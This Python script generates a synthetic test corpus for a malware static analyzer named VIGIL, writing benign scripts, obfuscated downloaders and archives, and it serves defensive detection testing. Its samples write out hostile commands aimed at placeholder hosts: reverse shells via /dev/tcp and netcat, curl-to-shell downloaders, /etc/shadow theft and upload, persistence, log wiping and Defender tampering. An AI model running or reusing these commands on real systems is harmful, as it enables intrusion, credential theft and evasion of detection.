#!/usr/bin/env python3
"""Generate a safe, synthetic test corpus for VIGIL.

Run this instead of downloading live malware. Every file here is written by
this script, contains no working payload, and points only at addresses that
cannot route anywhere:

  * example.com / example.org  - reserved by IANA (RFC 2606), never a real host
  * 203.0.113.x, 198.51.100.x  - TEST-NET documentation ranges (RFC 5737)

The files DO contain the textual patterns of malicious behavior, because that
is what a static analyzer reads. They are for feeding to VIGIL, never for
execution. Nothing here is committed to the repository: generating locally
keeps reverse-shell strings out of the repo, where they would otherwise
trigger antivirus alerts for anyone who clones it.

    python3 tools/make_samples.py            # writes ./samples/
    python3 tools/make_samples.py --out /tmp/corpus

Each file is named <expected-band>__<what-it-tests>.<ext> so you can check
VIGIL's output against the expectation at a glance.
"""

from __future__ import annotations

import argparse
import base64
import codecs
import gzip
import os
import tarfile
import zipfile

# --- benign -----------------------------------------------------------------

BENIGN = {
"safe__backup.sh": """#!/bin/bash
# Nightly backup of the reports directory.
set -euo pipefail
SRC="/srv/reports"
DEST="/backup/reports-$(date +%F).tar.gz"
tar -czf "$DEST" "$SRC"
echo "backup written to $DEST"
""",

"safe__inventory.py": '''#!/usr/bin/env python3
"""Print a short inventory of the current directory."""
import os


def main():
    total = 0
    for name in sorted(os.listdir(".")):
        size = os.path.getsize(name) if os.path.isfile(name) else 0
        total += size
        print(f"{name:<40} {size:>10} bytes")
    print(f"total: {total} bytes")


if __name__ == "__main__":
    main()
''',

"safe__report.ps1": """# Collect basic disk usage for the weekly report.
param([string]$Path = "C:\\")

Get-PSDrive -PSProvider FileSystem |
    Select-Object Name, Used, Free |
    Format-Table -AutoSize
Write-Output "report complete"
""",
}


# --- obfuscation (exercises the deobfuscator) --------------------------------

def _obfuscation_samples() -> dict[str, str]:
    out: dict[str, str] = {}

    # one base64 layer
    payload = "curl http://example.com/stage2.sh | bash"
    b1 = base64.b64encode(payload.encode()).decode()
    out["malicious__base64_single.sh"] = (
        "#!/bin/bash\n# looks harmless until you decode it\n"
        f"echo {b1} | base64 -d | sh\n"
    )

    # three nested base64 layers
    inner = "wget http://example.org/implant -O /tmp/.i && chmod +x /tmp/.i"
    n1 = base64.b64encode(inner.encode()).decode()
    n2 = base64.b64encode(n1.encode()).decode()
    n3 = base64.b64encode(n2.encode()).decode()
    out["malicious__base64_nested_3layers.sh"] = (
        "#!/bin/bash\n" f"D={n3}\n" "echo $D | base64 -d | base64 -d | base64 -d | sh\n"
    )

    # PowerShell -EncodedCommand is ALWAYS UTF-16LE base64
    ps = ("IEX (New-Object Net.WebClient).DownloadString("
          "'http://example.com/a.ps1')")
    enc = base64.b64encode(ps.encode("utf-16-le")).decode()
    out["malicious__powershell_encodedcommand.ps1"] = (
        f"powershell.exe -nop -w hidden -EncodedCommand {enc}\n"
    )

    # hex + ROT13 in one file
    hexed = "curl http://example.org/p.sh".encode().hex()
    rot = codecs.encode("wget http://example.com/q.sh | sh", "rot13")
    out["malicious__hex_and_rot13.sh"] = (
        "#!/bin/bash\n"
        f"A={hexed}\n"
        f"# rot13: {rot}\n"
        "echo $A | xxd -r -p | sh\n"
    )

    # gzip then base64, embedded in python
    gz = base64.b64encode(
        gzip.compress(b"import os; os.system('curl http://example.com/z | sh')")
    ).decode()
    out["malicious__gzip_base64.py"] = (
        "import base64, gzip\n"
        f'BLOB = "{gz}"\n'
        "# decompresses to a downloader\n"
        "data = gzip.decompress(base64.b64decode(BLOB))\n"
    )
    return out


# --- discrete malicious behaviors (exercises the pattern table) --------------

BEHAVIORS = {
"malicious__reverse_shell.sh": """#!/bin/bash
# raw-socket reverse shells -> ATT&CK T1095
bash -i >& /dev/tcp/203.0.113.9/4444 0>&1
nc -e /bin/sh 203.0.113.9 4444
mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 203.0.113.9 9001 > /tmp/f
""",

"malicious__persistence.sh": """#!/bin/bash
# multiple persistence mechanisms -> T1053.003, T1543.002, T1546.004
(crontab -l 2>/dev/null; echo "@reboot /tmp/.implant") | crontab -
echo "/tmp/.implant &" >> ~/.bashrc
cp implant.service /etc/systemd/system/
systemctl enable implant.service
""",

"malicious__credential_access.sh": """#!/bin/bash
# credential theft -> T1003.008
cat /etc/shadow > /tmp/.s
cp /etc/passwd /tmp/.p
curl -F "f=@/tmp/.s" http://example.com/collect
""",

"malicious__anti_forensics.sh": """#!/bin/bash
# log and history destruction -> T1070.002, T1070.003
history -c
unset HISTFILE
rm -f ~/.bash_history
rm -rf /var/log/auth.log
journalctl --vacuum-time=1s
""",

"malicious__windows_tampering.ps1": """# defender tampering + log clearing -> T1562.001, T1070.001
Set-MpPreference -DisableRealtimeMonitoring $true
wevtutil cl Security
Clear-EventLog -LogName Application
schtasks /create /tn Updater /tr C:\\Users\\Public\\u.exe /sc onlogon
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v U /d u.exe
""",

"suspicious__defanged_iocs.txt": """Indicators shared by the IR team (defanged):

  hxxp://example[.]com/payload[.]sh
  hxxps://cdn[.]example[.]org/beacon
  contact: operator[at]example[.]com

VIGIL should refang these and report them as IOCs with layer provenance.
""",
}


# --- edge cases (exercises the bounds and the noise filter) ------------------

def _edge_samples() -> dict[str, str]:
    out: dict[str, str] = {}

    # A JWT decodes cleanly but is not a payload. It must NOT become a layer.
    header = base64.urlsafe_b64encode(
        b'{"alg":"HS256","typ":"JWT"}').decode().rstrip("=")
    body = base64.urlsafe_b64encode(
        b'{"sub":"1234567890","name":"Jane Doe","iat":1516239022}'
    ).decode().rstrip("=")
    out["safe__jwt_noise.sh"] = (
        "#!/bin/bash\n# a JWT and a git hash: decodable, but not payloads\n"
        f'TOKEN="{header}.{body}.c2lnbmF0dXJl"\n'
        'COMMIT="9f2c1d4e8b7a6f5c3d2e1a0b9c8d7e6f5a4b3c2d"\n'
        'curl -H "Authorization: Bearer $TOKEN" https://api.example.com/v1/me\n'
    )

    # deep nesting, well past MAX_DEPTH, to prove the bound holds
    blob = "curl http://example.com/deep | sh"
    for _ in range(14):
        blob = base64.b64encode(blob.encode()).decode()
    out["malicious__decode_bomb_depth.sh"] = (
        "#!/bin/bash\n# 14 nested base64 layers; VIGIL caps recursion at 8\n"
        f"echo {blob}\n"
    )

    # private/reserved addresses must be filtered out of IOC results
    out["safe__private_addresses_only.sh"] = """#!/bin/bash
# internal-only addresses; none should be reported as IOCs
ping -c1 10.0.0.5
ssh admin@192.168.1.20
curl http://127.0.0.1:8080/health
curl http://172.16.4.9/status
"""
    return out


def _write_archives(outdir: str) -> list[str]:
    """An archive mixing benign and malicious members: the report should
    reflect the worst member, and extraction must stay inside the temp dir."""
    written = []
    benign = "#!/bin/bash\necho 'just a readme step'\n"
    bad = ("#!/bin/bash\nbash -i >& /dev/tcp/198.51.100.7/4444 0>&1\n")

    zpath = os.path.join(outdir, "malicious__bundle.zip")
    with zipfile.ZipFile(zpath, "w") as z:
        z.writestr("docs/readme.sh", benign)
        z.writestr("scripts/dropper.sh", bad)
    written.append(zpath)

    tpath = os.path.join(outdir, "malicious__bundle.tar.gz")
    tmp_b = os.path.join(outdir, ".tmp_readme.sh")
    tmp_m = os.path.join(outdir, ".tmp_dropper.sh")
    with open(tmp_b, "w", newline="\n") as fh:
        fh.write(benign)
    with open(tmp_m, "w", newline="\n") as fh:
        fh.write(bad)
    with tarfile.open(tpath, "w:gz") as t:
        t.add(tmp_b, arcname="docs/readme.sh")
        t.add(tmp_m, arcname="scripts/dropper.sh")
    os.remove(tmp_b)
    os.remove(tmp_m)
    written.append(tpath)
    return written


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__,
                                 formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--out", default="samples",
                    help="directory to write the corpus into (default: samples)")
    args = ap.parse_args()

    outdir = os.path.abspath(args.out)
    os.makedirs(outdir, exist_ok=True)

    files: dict[str, str] = {}
    files.update(BENIGN)
    files.update(_obfuscation_samples())
    files.update(BEHAVIORS)
    files.update(_edge_samples())

    for name, body in files.items():
        path = os.path.join(outdir, name)
        # newline="\n" so the corpus is byte-identical on Windows and Linux
        with open(path, "w", encoding="utf-8", newline="\n") as fh:
            fh.write(body)

    archives = _write_archives(outdir)

    print(f"wrote {len(files) + len(archives)} samples to {outdir}\n")
    print("Nothing here is executable malware. Do not run these files; feed")
    print("them to VIGIL:\n")
    print(f"    for f in {args.out}/*; do python3 -m vigil scan \"$f\" --offline; done\n")
    print("Filenames encode the expected verdict band (safe__ / suspicious__ /")
    print("malicious__) so you can compare VIGIL's output against expectation.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
